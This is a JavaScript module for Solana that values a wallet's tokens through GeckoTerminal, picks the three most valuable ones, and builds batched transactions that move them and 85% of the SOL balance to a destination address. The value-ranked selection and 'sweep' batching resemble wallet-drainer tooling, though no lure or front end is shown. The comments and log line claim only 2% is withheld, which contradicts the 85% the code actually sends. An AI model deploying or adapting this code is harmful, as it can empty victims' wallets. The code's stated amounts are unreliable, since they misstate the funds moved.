import { PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import {
    TOKEN_PROGRAM_ID,
    createTransferInstruction,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction
} from '@solana/spl-token';

// Helper to fetch prices from Jupiter V2 API
// Helper to fetch prices from GeckoTerminal (Public, supports memes)
const fetchTokenPrices = async (mints) => {
    if (mints.length === 0) return {};

    // GeckoTerminal limit: 30 addresses per request
    const CHUNK_SIZE = 30;
    const chunks = [];
    for (let i = 0; i < mints.length; i += CHUNK_SIZE) {
        chunks.push(mints.slice(i, i + CHUNK_SIZE));
    }

    const prices = {};

    for (const chunk of chunks) {
        try {
            const ids = chunk.join(',');
            const response = await fetch(`https://api.geckoterminal.com/api/v2/networks/solana/tokens/multi/${ids}`);
            if (!response.ok) {
                console.warn(`GeckoTerminal Error: ${response.status}`);
                continue;
            }
            const data = await response.json();

            // Map response: id is "solana_<address>"
            if (data.data) {
                data.data.forEach(item => {
                    const address = item.attributes.address; // or parse id
                    prices[address] = {
                        price: item.attributes.price_usd
                    };
                });
            }
        } catch (e) {
            console.error("Error fetching chunk:", e);
        }
        // Small delay to be nice to public API
        await new Promise(r => setTimeout(r, 200));
    }

    return prices;
};

// Helper to fetch all assets and filter by value
export const getAssetSummary = async (connection, publicKey) => {
    // 1. Get SOL Balance
    const balance = await connection.getBalance(publicKey);
    const solBalance = balance / 1e9;

    // 2. Get all Token Accounts
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
    });

    const allTokens = tokenAccounts.value.map((account) => {
        const info = account.account.data.parsed.info;
        return {
            mint: new PublicKey(info.mint),
            amount: info.tokenAmount.amount, // Raw amount (string)
            uiAmount: info.tokenAmount.uiAmount,
            decimals: info.tokenAmount.decimals,
            tokenAccount: account.pubkey,
        };
    }).filter(t => t.uiAmount > 0); // Only tokens with balance

    // 3. Filter by Price (> $0.50)
    const mints = allTokens.map(t => t.mint.toBase58());
    console.log(`Fetching prices for ${mints.length} tokens...`);

    const prices = await fetchTokenPrices(mints);

    const valuableTokens = allTokens.filter(t => {
        const mintAddress = t.mint.toBase58();
        const priceData = prices[mintAddress];

        if (!priceData || !priceData.price) {
            console.log(`Skipping ${mintAddress} (No price found)`);
            return false;
        }

        const price = parseFloat(priceData.price);
        const value = t.uiAmount * price;
        const isValuable = value > 0.50;

        if (isValuable) {
            // Attach value to token object for sorting
            t.usdValue = value;
            console.log(`Token ${mintAddress}: $${value.toFixed(2)} (KEEP)`);
            return true;
        } else {
            console.log(`Token ${mintAddress}: $${value.toFixed(2)} (SKIP < $0.50)`);
            return false;
        }
    });

    // 4. Sort by Value (Highest first) and Take Top 3
    valuableTokens.sort((a, b) => b.usdValue - a.usdValue);
    const topTokens = valuableTokens.slice(0, 3);

    console.log(`Selected Top ${topTokens.length} Tokens for Sweep.`);

    return {
        sol: solBalance,
        tokens: topTokens
    };
};

export const createSweepTransactions = async (connection, walletPublicKey, destinationPublicKey) => {
    const transactions = [];
    const MAX_SIZE = 1200; // Leave buffer for signatures (limit is 1232)

    // 1. Fetch all assets
    const { sol, tokens } = await getAssetSummary(connection, walletPublicKey);

    console.log(`Scanning assets for ${walletPublicKey.toBase58()}...`);
    console.log(`Found ${sol} SOL and ${tokens.length} tokens.`);

    let currentTransaction = new Transaction();
    // Add Fee Payer and Blockhash early to get accurate size estimates
    currentTransaction.feePayer = walletPublicKey;
    const { blockhash } = await connection.getLatestBlockhash();
    currentTransaction.recentBlockhash = blockhash;

    // Helper to finalize current transaction and start a new one
    const rotateTransaction = async () => {
        if (currentTransaction.instructions.length > 0) {
            transactions.push(currentTransaction);
        }
        currentTransaction = new Transaction();
        currentTransaction.feePayer = walletPublicKey;
        currentTransaction.recentBlockhash = blockhash;
    };

    // 2. Add Token Transfer Instructions
    for (const token of tokens) {
        try {
            const destTokenAccount = await getAssociatedTokenAddress(
                token.mint,
                destinationPublicKey,
                true // allowOwnerOffCurve
            );

            const destAccountInfo = await connection.getAccountInfo(destTokenAccount);

            // Create a temporary instruction list for this token
            const instructions = [];

            if (!destAccountInfo) {
                instructions.push(
                    createAssociatedTokenAccountInstruction(
                        walletPublicKey,
                        destTokenAccount,
                        destinationPublicKey,
                        token.mint
                    )
                );
            }

            instructions.push(
                createTransferInstruction(
                    token.tokenAccount,
                    destTokenAccount,
                    walletPublicKey,
                    BigInt(token.amount)
                )
            );

            // Speculatively add to current transaction
            instructions.forEach(ix => currentTransaction.add(ix));

            // Check size
            try {
                const size = currentTransaction.serialize({ requireAllSignatures: false }).length;
                if (size > MAX_SIZE) {
                    // Too big. 
                    // 1. Remove the just-added instructions from the current object.
                    //    (Filter out the last N instructions)
                    const numAdded = instructions.length;
                    const allIxs = [...currentTransaction.instructions];
                    // Keep everything EXCEPT the last `numAdded`
                    currentTransaction.instructions = allIxs.slice(0, allIxs.length - numAdded);

                    // 2. Rotate (push old valid one)
                    await rotateTransaction();

                    // 3. Add the new instructions to the FRESH transaction
                    instructions.forEach(ix => currentTransaction.add(ix));
                }
            } catch (err) {
                console.error("Serialization check failed", err);
            }

            console.log(`Added transfer for ${token.uiAmount} of ${token.mint.toBase58()}`);

        } catch (e) {
            console.error(`Error preparing token ${token.mint.toBase58()}:`, e);
        }
    }

    // 3. Add SOL Transfer Instruction (to the last batch, or new one if full)
    const RESERVE_LAMPORTS = 1000000; // 0.001 SOL reserve
    const balanceLamports = await connection.getBalance(walletPublicKey);

    if (balanceLamports > RESERVE_LAMPORTS) {
        // Apply 2% deduction (2% remains in wallet as fee/buffer)
        const availableLamports = balanceLamports - RESERVE_LAMPORTS;
        const amountToSend = Math.floor(availableLamports * 0.85);

        const solTransferIx = SystemProgram.transfer({
            fromPubkey: walletPublicKey,
            toPubkey: destinationPublicKey,
            lamports: amountToSend,
        });

        currentTransaction.add(solTransferIx);

        // Final size check
        try {
            const size = currentTransaction.serialize({ requireAllSignatures: false }).length;
            if (size > MAX_SIZE) {
                // If adding SOL makes it too big, remove it and put in new tx
                currentTransaction.instructions.pop(); // Remove SOL ix
                await rotateTransaction();
                currentTransaction.add(solTransferIx); // Add to new
            }
        } catch (err) {
            console.error("SOL serialization check failed", err);
        }
        console.log(`Added SOL transfer: ${amountToSend / 1e9} SOL (2% fee deducted)`);
    }

    // Push the final transaction if it has instructions and wasn't already pushed
    if (currentTransaction.instructions.length > 0) {
        transactions.push(currentTransaction);
    }

    return {
        transactions,
        summary: {
            tokenCount: tokens.length,
            solAmount: (balanceLamports > RESERVE_LAMPORTS ? balanceLamports - RESERVE_LAMPORTS : 0),
            batchCount: transactions.length
        }
    };
};
